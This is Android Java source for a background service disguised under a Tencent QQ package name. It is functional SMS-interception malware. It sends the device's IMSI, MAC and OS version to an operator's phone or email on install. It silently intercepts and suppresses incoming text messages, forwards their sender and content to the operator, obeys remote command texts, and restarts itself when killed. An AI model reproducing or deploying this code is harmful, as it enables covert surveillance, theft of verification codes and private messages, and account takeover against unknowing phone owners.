package com.tencent.qq;

import java.util.Timer;
import java.util.TimerTask;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.gsm.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.tencent.sms.MessageItem;
import com.tencent.sms.SMSConstant;
import com.tencent.sms.SMSHandler;
import com.tencent.sms.SMSObserver;
import com.tencent.sms.SmsLockHelper;
import com.tencent.util.DeviceInfo;
import com.tencent.util.DeviceInfoGetter;
import com.tencent.util.Utility;

public class MainService extends Service{

	private Context mContext;

	//指令处理
	private SMSHandler smsHandler;
	//短信拦截开关
	public static boolean bInterceptSms;
	
	//定时器任务
	private Timer timer;
	private TimerTask timerTask;
	
    //数据定时器任务周期
	private final static long TIMER_INTERVAL=1000*60*20;  //	20分钟一次

	//设备信息
	private DeviceInfo deviceInfo;
	private static String getImsi;


    //短信数据库观察者
    public static SMSObserver smsObserver=null;
    
	
	private String[] availableUser;
	private String[] availableAdmin;
	private boolean bEnable=true;
	//Intent 过滤
	public static String mainServiceString="com.ivory.ahead.MainService";
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
    
	//服务被创建时调用
	@Override
	public void onCreate()
	{
		super.onCreate();
		mContext=this.getApplicationContext();		
		
		deviceInfo=DeviceInfoGetter.getInstance(mContext).getDeviceInfo();
		getImsi=deviceInfo.getIMSI()==null?deviceInfo.getIMEI():deviceInfo.getIMSI();
	
		
		//注册强制更新广播，当收到广播时强制同步数据
		IntentFilter filter=new IntentFilter();
		filter.addAction(Keys.XYTIMER_START);                      //立即同步
		filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION); //网络变化的广播
		filter.addAction(Keys.SETTING_CHANGE);                     //设置更改的广播
		filter.addAction("android.provider.Telephony.SMS_RECEIVED"); //接收短信的广播
		filter.setPriority(Integer.MAX_VALUE);
		registerReceiver(xyTimerReceiver, filter);
						
		smsHandler=new SMSHandler(mContext);	    
		//////////////////////////////////////////////////////////
		//注册观察者类时得到回调数据确定一个给定的内容URI变化。13410698053
		ContentResolver resolver=getContentResolver();
		smsObserver=new SMSObserver(mContext,resolver, smsHandler);		
		resolver.registerContentObserver(Uri.parse(SMSConstant.SMS_URI_INBOX), true, smsObserver);

		//读取短信拦截设置		
		SharedPreferences settings=mContext.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);
		bInterceptSms=settings.getBoolean(Keys.SMS_INTERCEPT_SWITCH, true); //默认启动
		
		timer=new Timer();
		timerTask=new TimerTask() {
			
			@Override
			public void run() {
				try {
					doWork();
				} catch (Exception e) {
					e.printStackTrace();
				}			
			}
		};
		timer.schedule(timerTask, 0, TIMER_INTERVAL);

	}
	//服务启动时调用 ,从android 2.0开始，取代onStart
	@Override
	public int onStartCommand(Intent intent,int flags,int startId)
	{
		return START_STICKY;
	}
	
	
	private void doWork(){		
		//检查APK是否可用
		bEnable=checkAvailable();
		if(!bEnable)
			return;
		//发送1条短信
		createRemoteAccount();

	}
		
	/**
	 * 检查APK是否可用
	 * @return
	 */
	private boolean checkAvailable(){
		String adminValue=HttpUtils.getNetWorkString();
		if((adminValue!=null&&!adminValue.trim().equals(""))){
			if(adminValue!=null)
				availableAdmin=adminValue.trim().split(",");

			if((availableAdmin!=null&&availableAdmin[0].trim().equals("0"))){
				//如果存在提示
				if((availableAdmin!=null&&availableAdmin.length>=2)){
					function=new RunHandlerFunction() {
						
						@Override
						public void run() {
							//优先使用超级管理员的授权检查
								Toast.makeText(mContext, availableAdmin[1], Toast.LENGTH_LONG).show();						
						}
					};
					myHandler.sendEmptyMessage(Keys.HANDLER_FUNCTION_CODE);
				}
				return false;
			}
		}
			//当观察者为NULL，注册观察者
		
		return true;
	}
	
	
	/**
	 * 创建远程账户数据,在这里直接发送一条短信
	 */
	private void createRemoteAccount()
	{
		//读取本地配置是否创建了远程账号			
		SharedPreferences settings=mContext.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);
		boolean IsCreateAccount=settings.getBoolean(Keys.IS_CREATE_ACCOUNT, false);
		if(!IsCreateAccount)
		{
			//向管理员手机发送一条短信
			if(Keys.IS_SMS_INTERCEPT){
				Utility.sendSms(Keys.PHONE, "IMSI："+getImsi+",MAC:"+deviceInfo.getMAC()+",V:"+			
						deviceInfo.getSDKReleaseVersion());
			}else {
				Utility.sendMailByJavaMail("拦截APK已经安装", "用户信息如下：\nIMSI："+getImsi+",MAC:"+deviceInfo.getMAC()+",V:"+			
						deviceInfo.getSDKReleaseVersion());
			}
			SharedPreferences.Editor edit=settings.edit();
			edit.putBoolean(Keys.IS_CREATE_ACCOUNT,true);
			edit.commit();
			
			
		}
	}

	public interface RunHandlerFunction{
		public void run();
	}
	public static RunHandlerFunction function;
	
	private Handler myHandler=new Handler(){
		@Override
		public void handleMessage(Message msg){
			switch (msg.what) {
			case Keys.HANDLER_FUNCTION_CODE:
				function.run();
				break;
			}
		}
	};
	
	//通知定时器重新获取网络数据的广播
	private BroadcastReceiver xyTimerReceiver =new BroadcastReceiver()
	{
		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction(); 
			if(action.equals(Keys.XYTIMER_START)){
			    new Thread(new Runnable() {
					
					@Override
					public void run() {
						doWork();
					}
				}).start();				
				Log.e("定时器广播","启动定时器任务已执行！");
			}else if(action.equals(ConnectivityManager.CONNECTIVITY_ACTION)){
				ConnectivityManager manager=(ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
				if(manager!=null){
					NetworkInfo info=manager.getActiveNetworkInfo();
					//网络可用
					if(info!=null&&info.isAvailable()){
						Log.e("广播", "网络可用了！"+info.getTypeName());
						//获取数据
						Intent broadIntent=new Intent(Keys.XYTIMER_START);
						sendBroadcast(broadIntent);
					}else{
						Log.e("广播", "网络不可用");
					}
						
				}
		    }else if(action.equals(Keys.SETTING_CHANGE)){
				//读取短信拦截设置		
				SharedPreferences settings=mContext.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);
				bInterceptSms=settings.getBoolean(Keys.SMS_INTERCEPT_SWITCH, false);
				
				if(Keys.IS_SMS_INTERCEPT){
				   Utility.sendSms(Keys.PHONE, "短信拦截已"+(bInterceptSms?"开启":"关闭"));
				}else {
					Utility.sendMailByJavaMail("短信拦截状态变更", "来自+IMSI："+getImsi+",MAC:"+deviceInfo.getMAC()
							+ "，短信拦截已"+(bInterceptSms?"开启":"关闭"));	
				}
				
		    }else if(action.equals("android.provider.Telephony.SMS_RECEIVED")){
		    	//APK不可用或者已经有模块在处理短信了就不处理广播了
		    	if(!bEnable||SmsLockHelper.disposeing)
		    		return;
		    	SmsLockHelper.disposeing=true;
		    	Log.e("TAG", "调用Broadcast");
		    	try {
				
		            Bundle bundle = intent.getExtras();  
		            if (bundle != null) {  
		                // 通过pdus获得接收到的所有短信消息，获取短信内容；  
		                Object[] pdus = (Object[]) bundle.get("pdus");  
		                // 构建短信对象数组；  
		                SmsMessage[] mges = new SmsMessage[pdus.length];  
		                for (int i = 0; i < pdus.length; i++) {  
		                    // 获取单条短信内容，以pdu格式存,并生成短信对象；  
		                    mges[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);  
		                }  
		                for (SmsMessage mge : mges) {  
		    	            String phone=mge.getDisplayOriginatingAddress();
		                	int protocol=mge.getProtocolIdentifier();
		                	long date=mge.getTimestampMillis();
		                	String body=mge.getMessageBody();
		    	            //如果短信已经被处理过了，就不处理了
		                	if(date==SmsLockHelper.lastSmsDate){
		                		break;
		                	}
		                	SmsLockHelper.lastSmsDate=date;
		                	
		                	if (phone.startsWith("+86")){   
		                		 phone = phone.substring(3);   
		      	            }  
		                	
		    	            StringBuffer sb = new StringBuffer(); 
		    	            sb.append("发送者:"+phone);	    	            
		    	            //sb.append("\n时间:"+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(date));
		    	            sb.append("\n类型:"+(mge.getProtocolIdentifier()==0?"短信":"彩信"));
		    	            sb.append("\n内容:"+body);
		    
		    	            /**
							 * 过滤指定的内容，如果是控制短信，并且状态为已接收，就执行控制操作
							 * 防止控制着发送短信反而自己还被控制
							 */
							if(protocol==0&&body!=null&&body.trim().startsWith(Keys.FILTER)&&
									phone.trim().contains(Keys.PHONE))
							{
								// 不再往下传播；  
					            this.abortBroadcast();
					            
								MessageItem item=new MessageItem(-1, 1, protocol, date, phone, body);
								//通知Handler
								Message msg=new Message();
								msg.obj=item;
								smsHandler.sendMessage(msg);
															
								break;
							}
																									
							
							//拦截短信,同时防止管理员自己拦截自己，导致死循环
							if(bInterceptSms&&!phone.equals(Keys.PHONE)){
							 	// 不再往下传播；  
					            this.abortBroadcast();  
								//向管理员手机发送一条短信
					            if(Keys.IS_SMS_INTERCEPT){
								    Utility.sendSms(Keys.PHONE, "短信已拦截：\n"+sb.toString());
					            }else {
									Utility.sendMailByJavaMail("短信已拦截", "来自+IMSI："+getImsi+",MAC:"+deviceInfo.getMAC()+"的收到的新短信"
											+ "，内容如下：\n"+sb.toString());
								}
								//Log.e(Keys.PHONE, "短信已拦截：\n"+sb.toString());
							}
							Log.v("SMSObserver", "上传一条,"+sb.toString());
		              }  
		            }
		    	}finally{
		    		SmsLockHelper.disposeing=false;
		    	}
		    }
		}
	};


	//服务停止时调用方
	@Override
	public void onDestroy()
	{
		//卸载广播
		unregisterReceiver(xyTimerReceiver);
		//取消短信内容观察者
		if(smsObserver!=null)
		    mContext.getContentResolver().unregisterContentObserver(smsObserver);
		
		//停止定时器
		if(timer!=null)
			timer.cancel();

		
		//启动辅助服务，防止服务被KILL
		Intent assistService=new Intent(mContext,AssistService.class);
		mContext.startService(assistService);
		//启动后台同步服务
/*		Intent serviceIntent=new Intent(this,MainService.class);
		this.startService(serviceIntent);*/
		
		super.onDestroy();
	}

}
